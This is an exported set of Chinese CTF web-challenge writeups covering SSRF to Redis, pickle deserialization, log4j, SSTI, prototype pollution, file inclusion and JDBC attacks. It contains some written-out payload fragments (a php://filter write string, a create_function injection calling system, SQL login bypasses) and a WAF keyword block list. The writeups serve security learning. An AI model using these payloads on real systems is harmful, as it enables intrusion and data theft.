[{"title":"2023年春秋杯网络安全联赛冬季赛","date":"2024-02-19T08:34:47.000Z","url":"/post/2f513685.html","categories":["各赛事WP"],"content":"2023年春秋杯网络安全联赛冬季赛web ezezez_php考点： pop链 ssrf打redis的主从复制 首先可以查看hint.php 告诉我们redis服务器的ip不是db而是127.0.0.1 因此我们在我们自己的vps上起一个恶意reids服务然后用dict协议打即可 exp： 我们的恶意redis服务写入目标 env环境变量中就有flag picup考点： python格式化字符串漏洞 flask模板渲染ssti 首先可以将文件上传之后下载，这里存在任意文件读取 需要双写绕过一下 读到源码分别：app.py Users.py waf.py 大致思路就是身份伪造admin 之后上传pickle反序列化文件RCE (bushi 这里上传文件需要经过一个waf ban了一些命令执行的关键字 首先来看如果获取admin session部分 register.php路由部分存在格式化字符串漏洞 注册一个用户名为&#123;users.password&#125;的用户 就能泄露得到users变量所定义的实现注册登录接口Users类中的passwords密码字典 再根据源码可知 secret_key就等于admin密码 拿到key之后 接下来进行session伪造 接下来是怎么打pickle反序列化 waf ban了[b&quot;\\n&quot;,b&quot;\\r&quot;,b&quot;\\\\&quot;,b&quot;base&quot;,b&quot;builtin&quot;,b&quot;code&quot;,b&quot;command&quot;,b&quot;eval&quot;,b&quot;exec&quot;,b&quot;flag&quot;,b&quot;global&quot;,b&quot;os&quot;,b&quot;output&quot;,b&quot;popen&quot;,b&quot;pty&quot;,b&quot;repeat&quot;,b&quot;run&quot;,b&quot;setstate&quot;,b&quot;spawn&quot;,b&quot;subprocess&quot;,b&quot;sys&quot;,b&quot;system&quot;,b&quot;timeit&quot;]这么多关键词 并且构造opcode的关键字符换行符\\n也被过滤了 那么这条路是走不通了 根据源码本道题最关键的一点就是设置了flask app模板渲染路径为./也就是&#x2F;app路径 因此还存在render_template函数 我们文件上传路径为./uploads/ 因此我们上传的文件都可以被作为flask的模板文件渲染 所以我们可以先上传一个恶意的ssti的poc模板文件 然后通过pickle反序列化调用render_template函数渲染他 就能实现RCE了 直接反弹shell比较好 因为题目每隔一段时间会删除我们上传的文件 我们最后还要借助这一点去提权 可以看到clear.sh文件是root权限运行的 并且我们有w权限 那么我们直接将clear.sh文件内容改为echo &quot;cat /flag &gt; /1.txt&quot; &gt; clear.sh 稍等一段时间就会看到创建了有flag的1.txt Active-Takeaway知识点参考："},{"title":"NCTF2023学习","date":"2024-02-08T08:51:48.000Z","url":"/post/ad0eb4be.html","categories":["各赛事WP"],"content":"NCTF2023学习 logging考点： log4j 进入界面啥也没有 根据题目提示可能考的是log4j，既然知道了那么JNDI的注入点应该在哪里呢 那只有试试请求头参数了 当试到Accept请求头时候，出现了406响应码 Accept 头, 如果 mine type 类型不对控制台会调用 logger 输出日志，还有 Host 头, 但是只能用一次, 第二次往后就不能再打印日志了 HTTP 406状态码是指”不可接受”（Not Acceptable）。服务器收到的请求中包含了一个或多个要求资源的表示形式，但服务器无法生成与请求中所述的任何形式相匹配的响应。这意味着服务器无法提供与请求的Accept标头中指定的格式相匹配的响应。 这里存在JNDI注入点 进一步测试 发现确实存在 并且是出网的 那么我们起一个LDAP服务 带一个反弹shell的恶意类即可 推荐项目： Webshell Generator点击下载我们的webshel之后，抓包 发现路由重定向 一眼丁真这里可能存在路径穿越 可以 根目录flag文件不是/flag 并且环境变量中的flag也被删了 还是老老实实来分析 首先看看index.php和 download.php index.php通过$filename = shell_exec(&quot;sh generate.sh&quot;);来帮我们生成文件名 读来看看generate.sh 可以看到我们输入的方法和webshell密码都会被导出到环境变量中 然后sh脚本文件会从环境变量中读入我们的方法和webshell密码然后拼接到sed命令中 那么这里可能存在shell命令注入 但是不行 只能展开为单个参数 查看sed命令选项 发现-e可以执行系统命令 根据man手册[(%3B)]( be separated by semicolons (%3B)) sed指令可以通过换行符分隔，也可以通过;分隔。 我们的payload： 成功 Wait What给了源码： 最主要的逻辑代码是鉴权中间件这块 我们想拿到flag 就需要鉴权以admin身份登录 但是每次鉴权之前banned_users.push(&quot;admin&quot;)都会执行这条语句把admin给ban了 无法以admin身份登录 test1是关于正则的鉴权，来看看正则 遍历封禁用户的数组，以^admin$|^hacker$|的形式，用g全局匹配返回一个正则表达式 这里有一个trick就是RegExp.lastIndex的使用，当它开启g属性的时候，lastIndex会起作用，它用于表示从哪一个位置开始进行匹配 有两种情况： 当regexp.test匹配成功，lastIndex会被设置为最近匹配成功的下一个位置 当regexp.test匹配失败，lastIndex被设置为0 那么第一段鉴权： 每次请求都会通过build_banned_users_regex()生成一个新的正则表达式使得每次匹配都从lastIndex=0开始，如果能够在第一次匹配到admin使得lastIndex索引变成5之后，第二次没有生成新的就匹配，那么就成功绕过了第一层的鉴权，而这里是使用try-catch进行处理的，即使抛出异常，程序也不会中断。所以可以使用其它类型的ban_username，就会抛出TypeError异常，从而不生成新的lastIndex，绕过第一层。 再来看test2 其实这里in关键字只存在于python 而在js中的用法：用于检查对象是否具有指定属性或者原型链中是否存在指定的属性 由于 banned_users 为 Array 类型，不存在 admin 属性，因此 test2 实际上判断的是banned_users中是否存在数组索引为username的值（由于对象的属性名称会被隐式转换为字符串，”0”和0都可以作为数组索引） 现在的问题是每次在请求时都会创建一个新的 banned_users_regex ，恢复其 lastIndex 位置为初始值0 如果我们能在新的regex对象赋值之前，抛出异常来绕过 regex 的更新，那么就可以了 传入 escapeRegExp(string) 函数中的 string 参数为非字符串类型 则string不存在 replace 属性，会抛出TypeError，以此来绕过 regex 的更新 首先我们注册一个账号然后使用封禁路由 push一个对象类型，此时就会报错抛异常，bypass lastIndex的重制 然后用admin登录 第一次会被正则到使得lastIndex为5 第二次admin登录则不会被正则 此时从第五个字符开始正则 调试可以观察到： 这次的banned_users_regex.lastIndex并没有被重制 第二次登录就会拿到flag ez_wordpress环境不太对劲 wpscan扫出来的洞和其他师傅wp不一样 太诡异了 可能是我自己环境搭的有问题。。。 是phar+文件上传+ssrf的组合拳 可看X1r0z师傅的官方wp EvilMQ先等等 house of click搭环境这里遇到了问题，有时候docker-compose up -d会报错，拉不到镜像，这里建议换源清华的镜像可以解决这个问题 这个题就是纯是学习了 压根没见过 给了源码： 可以看到是有四个路由的但是进入题目环境之后只有nginx的页面 也访问不到路由 大致看源码思路就是通过sql注入拿到token，然后再拿着token去文件上传，然后文件上传也有路径穿越因为直接通过os.path.join拼接文件名，穿越到模板文件目录直接访问index进行ssti。 根据X1r0z师傅的WP 思路: nginx + gunicorn 路径绕过 ClickHouse SQL 盲注打 SSRF web.py 上传时的目录穿越 + Templetor SSTI 实现 RCE 首先是nginx + gunicorn 路径绕过 参考：   首先需要知道什么是gunicorn 直接拷打gpt payload：POST /query HTTP/1.1/../../api/ping HTTP/1.1 发现query路由下存在sql注入，不过这里不是mysql了，而是clickhouse数据库 接下来是ssrf 查阅官方文档发现有个url函数 发送post请求上传文件需要insert，这里没法进行堆叠注入 clickhouse自己有个HTTP Interface 通过它可以实现GET请求insert语句 先ssrf自身的HTTP interface然后再去ssrf到backend TabSeparatedRaw表示返回的数据采用制表符分隔的原始数据格式 x String表示外部查询返回的数据类型为字符串 接下里的思路就是先select拿到token然后套一个url函数将token编码后外带 接着insert发送post请求上传文件到backend index留了POST方法用于渲染其他模板 就可以通过路径穿越将文件上传至templates目录然后 render这个模板 实现SSTI 拿token 拿到token：38ad6332afaa1e3fc75f6a6b60cdd909 insert上传文件payload: 内容是最简洁的上传一个文件的请求头和请求体 可见我们的文件已经被上传了 这里需要注意的是后端接受表单的名称为myfile而不是file，还有就是根据给的附件nginx.conf上传upload时候nginx反向代理location内网端口为8001 接着到index render test.html实现RCE 拿到flag 总结做X1r0z师傅出的题总能学到不少知识，而且赛后还给复现环境的dockerfile，很难不爱！！ 看官方文档的能力真的很重要，基本功同样重要！！！ java继续探索！ 参考： [(Post-Match)/#house-of-click]( 2023 Web Writeup(Post-Match)&#x2F;#house-of-click) "},{"title":"第六届安洵杯WEB赛后解题","date":"2024-01-29T05:29:48.000Z","url":"/post/c4db13dc.html","categories":["各赛事WP"],"content":"第六届安洵杯WEB赛后解题 沙贝期末幽默了 没打 正好主办方给了docker环境 自己搭 赶紧看一下题 quick 太幽默了 easy_unserialize简单的pop链 按照当时题目环境是phpinfo中就有flag的值 那么我们就可以投机取巧 exp如下： 值得注意的是里面套了两层的md5值 可以利用脚本爆破出来 参考：md5相等及碰撞绕过_md5强等于绕过-CSDN博客 脚本里面有些错误并且要用python2环境 可以打通 当然这个题目考点还有原生类 只需要将最后调用phpinfo 换为Flag对象即可触发__invoke() 先扫目录在读文件 exp如下： 还有个知识点就是array_walk()这个函数 那么这里需要注意它不仅可以对数组还有对象 如果是对象的话就会把属性的值作为callback的第一个参数 属性名作为第二个 这里很巧妙 What’s my name考点： create_function 注入 唤起我远古的记忆 记得之前在ctfshow上做过 源码如下： 首先是正则匹配规定了d0g3参数只能用5个字符 +include开头 然后这里有两个create_function 第一个create_function 其实用来让我们匹配这个匿名函数后两位数字的 我们来看看这个$miao是什么 可以看到是\\000lambda_6其实本质是\\000lambda_%d 这是匿名函数的名字 并且%d是指当前第几个匿名函数 每提交一次就会+1 因此如果我们想strlen($d0g3)==substr($miao, -2)条件成立 那么就需要不断发包 接下来是第二个create_function 这里考察的就是注入了 思想类似于sql注入&quot;]);&#125;include(&quot;index.php&quot;);system(&quot;env&quot;);// 写一个脚本 需要注意的是有时候匿名函数名称为\\x00lambda_%d 在win环境下是\\000lambda_%d signal考点： js yaml 审计一下 发现它可以将yaml文件解析为js对象 然后会将name渲染出来 根据js-yaml中文文档|js-yaml js中文教程|解析 | npm中文文档 发现支持调用函数 4.0.0 released · nodeca&#x2F;js-yaml@ee74ce4 js-yaml的version 是3.14.1 ，跟新版本提交对比这是默认为危险模式的最后一个版本，该模式允许您使用 tag 构造任意 JS 函数。!!js&#x2F;function 在模版渲染的地方,会自动调用对象的tostring方法 "},{"title":"ctfshow-文件包含","date":"2024-01-29T05:26:01.000Z","url":"/post/ad175165.html","categories":["ctfshow"],"content":"ctfshow-文件包含 WEB-78(php:&#x2F;&#x2F;filter) WEB-79(data:&#x2F;&#x2F;) WEB-80~81(日志包含)在User-Agent:写入一句话木马 然后访问nginx日志文件路径?file=/var/log/nginx/access.log WEB-82~86(session.upload_progress条件竞争)这道题目利用session.upload_progress进行文件包含和条件竞争 相关文章可以看这篇 条件: php5.4 session.upload_progress.enabled&#x3D;on 当我们上传一个文件 php会把此次文件上传的详细信息存储在session中 session.upload_progress.cleanup &#x3D; on 上传完毕后 php立即清理对应session文件中的内容 session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS” php会报告上传进度，对我们有用的是它的值可控 session.upload_progress.prefix &#x3D; “upload_progress_” 它和上面的name prefix+name将表示为session中的键名 session.use_strict_mode&#x3D;off 这个表示我们对Cookie中的sessionid可控 首先就是没有session_start()我们该怎么创建session文件 session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。 我们在Cookie里设置PHPSESSID&#x3D;flag，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session。并产生一个键值，这个键值由ini.get(&quot;session.upload_progress.prefix&quot;)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。 但是我们session文件上传后会被立马删除 这里就要利用条件竞争 一边一直发包一边一直去访问 总有一次能访问成功 因此我们所需要做的就是： 上传文件 在Cookie&#x3D;flag 请求包中添加：PHP_SESSION_UPLOAD_PROGRESS然后内容设置为我们的恶意代码（会被写入sess_flag文件中 ） 不断的发包去条件竞争 发包post数据包： 爆破的两个数据包： 先爆破文件上传 再爆破包含的数据包 但是两个是一起爆破的 WEB-87（exit死亡绕过）这里面讲的很清楚 就是这里&lt;?php die(&#39;大佬别秀了&#39;);?&gt;die() 跟exit()函数一样就是脚本运行到这里会退出脚本 也就是说即使我们输入一句话木马 有exit()存在那么永远运行不到我们的木马就会提前退出脚本 这里利用了php://filter/write=convert.base64-decode/resource=1.php注意这里是写入 将$content解码 利用php base64_decode函数特性去除死亡exit。 base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过 所以，当$content 包含 时，解码过程会先去除识别不了的字符，&lt; ; ? &gt;和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符a后，将phpexita当做两组base64进行解码，也就绕过这个死亡exit了。 payload： get: php://filter/write=convert.base64-decode/resource=1.php对其进行两次url全字符编码 ?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30因为一次解码在浏览器解析 一次解码在题目中 post: 前两个a是用来和phpdieaa组成4个byte 也就是两组 用于base64解码 直接就干掉这个死亡die了 真的太强了 后面的内容是一句话木马base64编码内容 WEB-88(过滤) 这里还要把用来base64补位的==去掉因为waf 因为&#x3D;&#x3D;只是用来补位的所以删除不会影响解码正常 WEB-116(Misc)提一句视频剪辑的不错:) binwalk分离出源码 WEB-117(exit死亡绕过)大致思路和87一样 不过这里waf了base64 换种解码方式就行了 直接偷别人的payload payload由来： 结尾：文件包含难度还行 keep hacking！ 开启下一大陆 php特性 ！"},{"title":"DASCTF 2023 & 0X401七月暑期挑战赛 部分WEB复现与学习","date":"2024-01-29T05:22:08.000Z","url":"/post/731522c3.html","categories":["各赛事WP"],"content":"DASCTF 2023 &amp; 0X401七月暑期挑战赛 部分WEB复现与学习 EzFlask跟标题就是flask有关的 进入题目直接给了源码 大致看一眼 经典的python原型链污染 当时做的时候也成功登录了 但是我不知道污染哪里这个题目 应该是我没见过的知识点 预期解：其实最重要的一部分我反而没有看到 qwq __file__：当前脚本运行的路径 这里我们如果能污染__file__值 那么我们就可以读取任意文件了 还有就是这题开了pin 而且还有个/console路由 这是咋发现的真离谱 然后是黑名单waf了__init__ 在check()之后是进行了一次json.loads的，而json识别unicode 所以可以用unicode编码进行bypass 预期解就是利用任意文件读取然后计算pin码 就可以getshell了 这里就不赘述了 非预期真正学习的是非预期 这里有两种payload: 第一种：污染__**file__**任意文件读取前面也说过原理了 只要我们将__file__污染为我们想读取的文件名即可 直接读环境变量 然后访问/proc/1/environ 出题人环境变量中的flag忘删了 第二种: 污染 _static_folder 路径穿越首先来看看 _static_folder flask init文件部分代码 可以看到static_folder=&#39;static&#39; 默认是在static文件也即是默认的静态文件的位置 我的理解是 我们static_folder可以指定静态文件的位置 并且我们可以访问 一般我们做题都有注意到我们可以访问static目录 那么 如果我们污染_static_folder让他的路径为/ 那么我们是不是可以根目录下的所有文件了 因此我们就可以路径穿越了 注意一下路径/static/proc/1/environ MyPicDisk这道题目 如何上传文件的同时并且post数据 我尬住了 不太会 额额额 抽象 然后赛后看了师傅们的wp 真的太强辣 首先用户名存在万能钥匙登录 admin&#39; or 1=1# 就可以登录了 然后存在源码泄露/y0u_cant_find_1t.zip 源码逻辑也比较清楚 我寄在了怎么一边上传文件一边post传参 根据源码逻辑 我们先要登录成功 然后才能上传文件 所以post传参和发包同时弄 我不太会 因为这个题目登录成功之后还会退出来 不会留在上传文件的页面 所以我们要手动发包 我只会用现成的脚本 所以就寄了 赛后看师傅们的wp 是用py脚本的发的 真的太强了 然后这道题目最明显的就是 FILE类的析构函数存在一个命令执行漏洞然后就能想到是phar反序列化了 那么一般我们phar反序列化还要配合能够触发反序列化的文件操作函数才行 看了下这道题目源码没有这些函数 但是这次又学到一个函数就是md5_file() 在源码这个地方 如果我们提交get参数 file和todo 那么他将会将我们的文件进行md5_file()后输出 那么phar反序列化能够搭配的函数又多了一个qwq 所以思路明确 先phar生成一个包含我们恶意序列化的图片 然后配合脚本 上传上去 偷的 师傅真的太强了 先登录+上传文件 然后登录+phar包含 都是同时进行每一步 又学到了 之后要好好学一下requests这个库和其他常用库 ez_cms熊海cms v1.0 文件包含+pearcmd 第一次见 关于pearcmd:  payload: 这个pearcmd的文件路径很难找 要一个一个试 ?r=../../../../../../../tmp/123访问rce就行了 反正我没复现成功 感觉是赛后靶机和比赛的不一样 rce不了 还是我姿势不对 无语了 ez_py考点：django session pickle反序列化 不太会 以后再来看 还是第一次见 ez_timingHTTP&#x2F;2??????? 6 "},{"title":"NSSCTF 2nd WP与学习","date":"2024-01-29T05:04:17.000Z","url":"/post/c7a57718.html","categories":["各赛事WP"],"content":"NSSCTF 2nd WP与学习 php签到 一道文件上传的题目，主要就是后缀名怎么去绕过pathinfo()函数 参考以下文章   在操作系统中，都是禁止使用&#x2F;作为文件名的，但是不知道为什么后面加一个.就可以成功的写入1.php了。 $pathinfo[extension]&#x3D;pathfo($name,PATHINFO_EXTENSION) 获取文件后缀名时时获取的 . 后面的内容，当出现多个 . 时，结果为最后一个 . 后面的内容。所以可以利用这个特性实现对后缀名检测的绕过。 所以用/.绕过就行 记得要url编码一下 上传成功后 就是rce即可 2周年快乐！进入题目中win12系统 用里面的cmd发个curl 就能在nss站内收到flag邮件了 MyBox非预期了 直接就在环境变量中 MyBox(revenge)一道gopher协议 打apache2.4.49 ssrf+路径穿越RCE的题目 做题根本想不到 首先获得源码 先发包看看80端口 偷的大佬的 显示apahce2.4.49 然后是一个gopher+路径穿越rce 参考： 可以构造这种请求包来rce 直接用god脚本 不用手动去构造%0D%0A 还有一个小点是那个_ 一定要加不然会将之后数据第一个字符吞了 参考: 还有一个小点就是我们都找到三个双引号或者单引号在python中是注释符 但是也可以被当作用来括普通字符串的qwq MyJs源码如下： 先是ejs空密钥缺陷 先注册获取一个时间戳 sid为token中的secretid，直接取数组让其报错为undefined 看大佬师傅的博客是因为jwt空算法攻击导致可伪造 官方： verify时正确的参数是algorithms而不是algorithm，所以这里本质传了个空加密，导致允许空密钥，我们无须获得JWT密钥（高版本已修改）。 第二个是关于sid的弱比较，如果只是允许空密钥的话我们不知道secret依然无法verify，这里sid如果传个数组就能轻松绕过判断并且 然后本地构造一个nss账号的token 然后登录 可以看到&#x2F;update路由下存在原型链污染 之后就是去找链子 没找到。。。。低能 是高版本ejs3.1.7的链子 终于找到出处了 还是个cve 妈的CVE-2022-29078 成功 MyHurricane源码如下 一眼丁真是tornado的ssti了 payload大致上和我们学习flask ssti一样 都有稍有不同 waf了 [&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;__&#39;, &#39;(&#39;, &#39;)&#39;, &#39;or&#39;, &#39;and&#39;, &#39;not&#39;, &#39;&#123;&#123;', '&#125;&#125;&#39;] 我死在了括号上 当时在想连括号都waf了 怎么了构造payload啊 之后发现大佬们根本不用括号。。。。 还有就是又有非预期 非预期直接用文件包含 或者 当然记得url编码打入 预期还有另一种是god 的payload 这种方法利用了tornado里的变量覆盖，让__tt_utf8为eval，在渲染时时会有__tt_utf8(__tt_tmp)这样的调用，然后让__tt_tmp为恶意字符串就好了，我fuzz了一下，上述payload中raw语句可以给tmp赋值，所以rce 就是常规的模板语句，只是输出不会被转义 request.body_arguments：request.body_arguments 是 Tornado 框架中的一个属性，用于获取当前 HTTP 请求中的表单数据或URL编码数据。 在 HTTP 请求中，请求体（body）通常用于传输 POST 请求中的表单数据或 URL 编码数据。request.body_arguments 可以解析并返回这些数据的字典形式。 request.method是 Tornado 框架中的一个属性，用于获取当前 HTTP 请求的请求方法 来自: 真的太强了qwq 又学到新姿势了"},{"title":"0xgame2023 web复现学习","date":"2024-01-29T04:34:50.000Z","url":"/post/7a0dbac6.html","categories":["各赛事"],"content":"0xgame的师傅出的题都很好！！ WEEK1[Week 1] signin找j源码就有 [Week 1] hello_http经典考察http协议 [Week 1] baby_php经典题型 注意一下这里就是要用伪协议去读 别直接包含flag那样读不出来的 [Week 1] ping疑似被搅屎了 没搅屎的payload: 用base64编码绕过就行 [Week 1] repo_leak要用这个工具才能找到git泄露 githack拉取不到 然后翻源码能找到 WEEK2操你妈不知道是我这里校园网的原因 环境一直像狗屎一样恶心我 文件上传一直访问不到文件 sql注入一直转圈链接失败 [Week 2] ez_upload考点: 二次渲染  项目地址 [Week 2] ez_sqli考点: 堆叠注入 预处理 报错注入 payload： 需要注意的几个点是: 0x字符串是预处理语句的字符转16进制 最后报错注入获得flag的时候要利用substr函数截取flag 不然显示不全 语句间虽然没有ban空格但是空格会被tun 还是给替换了。。 反正/**/绕一下 [Week 2] ez_unserialize 一开始对这里有点陌生 自己举个例子理解一下 如果这是$this-&gt;data是个数组 那么就很好理解了 记录一下 然后是pop链构造 注意： 这里赋值数组时候不能用array(&quot;1&quot;=&gt;&quot;1&quot;); 要用[&quot;1&quot;=&gt;&quot;1&quot;] 实测第一种会断开链子 expired函数调用在这里 很微妙 容易忽略 [WEEK2]ez_sandbox一道原型链污染+vm沙盒逃逸的题目 源码如下： 首先需要原型链污染让我们以admin身份登录 这里禁用了__proto__ 所以这里可以通过constructor.prototype来bypass 因为__proto__=constructor.prototype 之后就是vm沙盒逃逸 参考NodeJS VM和VM2沙箱逃逸 - 先知社区 因为this为null 所以我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。 我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了 除此之外这道题沙箱没有返回值 我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出 在沙箱内可以通过 throw 来抛出一个对象 这个对象会被沙箱外的 catch 语句捕获 然后会访问它的 message 属性 (即 e.message)通过 JavaScript 的 Proxy 类或对象的 defineGetter 方法来设置一个 getter 使得在沙箱外访问 e 的 message 属性 (即 e.message) 时能够调用某个函数 除此之外还要绕一下waf 这里提供两种paylaod bypass姿势参考：nodejs中代码执行绕过的一些技巧-安全客 - 安全资讯平台奇安信攻防社区-NodeJS中的RCE的利用和绕过 WEEK3[Week 3] notebook考点： pickle反序列化 源码如下： 大致审计一下 大致思路为/add_note下会将我们提交的数据进行pickle序列化 内容保存在session中 然后在/&lt;path:note_id&gt;进行pickle反序列化 那么如果我们可以控制session 将里面的正常序列化数据改为恶意数据 那么就可以实现RCE了 遇到的一些问题： 首先是flask_unsign脚本爆破sercet的问题 这个脚本需要最原始的session来进行爆破 如果是提交了任何参数的session都会爆不出secret 因为我们opcode加上我们的payload一般还有一些特殊字符比如/ &amp;那么进行伪造session的时候就会涉及到转义的问题 转义头都大了 这里Aecous师傅提供了一种好的方法 可以现在自己本地搭建好题目 然后修改相关生成的session的参数 让题目自己去处理session转义问题 然后直接本地获取含恶意payload的session然后再提交给题目 （记得本地secret_key也要保持和题目一致 ） 关于R指令的问题这个题目好像R指令稍稍有点问题导致没法弹回payload 可以试着用其他指令比如我用的是i指令 （回来补坑了 因为用pickle.dumps() 来生成 payload, 不同操作系统⽣成的 pickle 序列化数据是有区别的 因此我们windows生成的payload在linux用不了 参考：pickle反序列化初探 - 先知社区） [Week 3] rss_parser源码如下： 简单审计 大致思路为它会通过http协议去访问一个网站 然后将其访问到的内容通过xml解析出来 然后正则匹配相关的内容 然后帮我们渲染出来 resolve_entities=True重点关注这个 如果这个选项被设置为了true 那么它就会帮我们解析xml实体 来自：python_code_audit&#x2F;XXE.md at master · MisakiKata&#x2F;python_code_audit 除此之外debug=True这意味着 如果我们能计算出pin值 我们就可以通过/console直接进行rce 所以我们的思路就是: 用vps起一个python http服务 然后把有恶意内容的xml文件放其目录中 访问 读取相关计算pin码的文件 rce xml文件内容如下： 起http服务 读取到相关配置文件内容 然后这道题目其实/proc/self/cgroup是空的 只需要读取/etc/machine-id值就可以计算machine-id了 然后用户是app 路径报错得到 计算pin码 直接反弹shell 拿下 [Week 3] zip_file_manager考点： 软链接 直接通过软链接将根目录下的flag勾出来 [Week 3] web_snapshot考点： redis主从复制 ssrf gopher协议 主要源码如下： index.php ping.php cache.php 简单审计就能看到index.php中存在ssrf 并且限制了只能以http&#x2F;https协议 当然curl除了http&#x2F;https协议外还支持dict&#x2F;gopher协议 再来看curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); 当其被设置为true时 会根据服务器http头中的location进行重定向 二者结合起来 我们就可以通过 Location 头把协议从 http 重定向至 dict &#x2F; gopher 再审计cache.php和ping.php可知 web服务和redis服务不在一个服务器上 这就导致我们没法直接通过写入文件getshell 那么就要利用到redis主从复制了 参考：Redis 基于主从复制的 RCE 利用方式 Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 通过slave of设置主从状态 （偷的图） 可以看到在主机修改值之后会同步到从机上 利用原理： 当两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上 然后我们可以利用从机加载so文件，我们就可以执行拓展的新命令了 整个流程图如下： 首先先生成重定向恶意文件 在vps起个php文件用php -S 0.0.0.0:port或者用nginx，apache都行 让题目去依次访问这两个文件 再起个恶意redis server 推荐：GitHub - Testzero-wz&#x2F;Awsome-Redis-Rogue-Server: Redis-Rogue-Server Implement 恶意Server使用，-v为恶意Server模式，指定port和恶意文件开启监听 这里恶意so文件由Aecous师傅完成的真的tql 魔改RedisModulesSDK&#x2F;exp&#x2F;exp.c一个函数，make编译后生成exp.so文件 项目地址： 魔改内容为： 起server 访问1.php 恶意服务器会持续通信写入 之前代码没有加quit的话 会一直写入 一次就可以exit出来了 然后访问2.php 加载恶意so文件 反弹shell [Week 3] GoShop考点： 整数溢出 这里直接看官方WP吧 0xGame 2023 Web Official Writeup 本人乱点出的qwq WEEK4[Week 4] spring(学习)考点： Spring Boot Actuator未授权 headdump泄露 Actutator是一个生产环境部署时可使用的功能，用来监控和管理应用程序。支持选择HTTP Endpoints 或者JMX的方式来访问，同样支持查看应用程序的Auding,health和metrics信息。 首先访问/actuator/env 查看环境变量发现flag是密码 密码被改为星号了 访问/actuator/headdump spring actuator 默认会把含有 password secret 之类关键词的变量的值改成星号, 防⽌敏感信息泄露 但是我们可以通过 &#x2F;actuator&#x2F;heapdump 这个路由去导出 jvm 中的堆内存信息, 然后通过⼀定的查询得到 app.password 的明文 这里我用的是MAT工具Eclipse Memory Analyzer Open Source Project | The Eclipse Foundation 查询语句： [Week 4] auth_bypass(学习)考点： Tomcat Filter绕过+java任意文件下载搭配WEB-INF目录利用 源码如下： AuthFilter.java DownloadServlet.java 简单审计就是一个文件读取的功能 并且有blacklist 首先如何绕过blacklist ..和关键字/download 这里利用了java中 getRequestURI() 的缺陷 这个函数在解析url时不会自动进行url解码 也不会进行标准化 (去除多余的/和..) 参考：getRequestURI 导致的安全问题 - depycode - 博客园 以直接访问 //download 就能绕过 之后目录穿越下载文件的时候可以将.. 进行⼀次 url 编码 就能绕过 所以可以通过 //download?filename=文件 来读取文件 这道题目需要./readflag因此不能直接将flag读出来 根据题目描述 网站使用war打包 Tomcat 在部署 war 的时候会将其解压, ⽽压缩包内会存在⼀个 WEB-INF ⽬录, ⽬录⾥⾯包含编译好的 .class ⽂件以及 web.xml (保存路由和类的映射关系 ） 下载web.xml 可以看到EvilServlet类的/You_Find_This_Evil_Servlet_a76f02cb8422路由 通过包名 (com.example.demo.EvilServlet) 构造对应的 class 文件路径并下载 再利用JD-GUI工具进行反编译打开 发现命令执行利用点 利用这个工具生成paylaod java.lang.Runtime.exec() Payload Workarounds - @Adminxe 记得post打入的时候url全字符编码一下 成功 [Week 4] YourBatis(学习)考点： MyBatis低版本OGNL注入 OGNL 表达式注入 首先将给的jar包进行反编译 在idea打开 首先查看依赖 发现存在MyBatis依赖 并且是低版本2.1.1 该版本存在OGNL表达式注入 之后开个篇章学习一下 WP就不过多赘述了 推荐：奇安信攻防社区-从一道CTF题浅谈MyBatis与Ognl的那些事Mybatis 从SQL注入到OGNL注入 - panda | 热爱安全的理想少年 存在一个&#x2F;user路由 主要代码如下 可以看到username直接被拼接进了查询语句 因此这里就存在sql注入 更严谨应该是OGNL表达式注入 直接利用OGNL表达式命令执行反弹shell 无法进行反弹shell 因为传入的内容包含&#123;和&#125;会被递归解释为另一个OGNL表达式的开头与结尾 官方wp是利用OGNL 调用Java 自身的 base64 decode方法 java基础知识还是缺少很多 得去狂补 [Week 4] TestConnection（学习）考点： MySQL &#x2F; PostgreSQL JDBC URL Attack 解法一直接看官方WP JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问 JDBC URL 就是用于连接数据库的字符串, 格式为 jdbc:db-type:&#x2F;&#x2F;host:port&#x2F;db-name?param&#x3D;value db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite db-name 是要使用的数据库名 param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等 当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE 看看依赖 根据mysql版本8.0.11 找到对应的驱动利用 MYSQL JDBC反序列化解析 - 跳跳糖 或者用工具生成payloadGitHub - 4ra1n&#x2F;mysql-fake-server: MySQL Fake Server (纯Java实现，支持GUI版和命令行版，提供Dockerfile，支持多种常见JDBC利用) 注意这里选用的CC6的链子 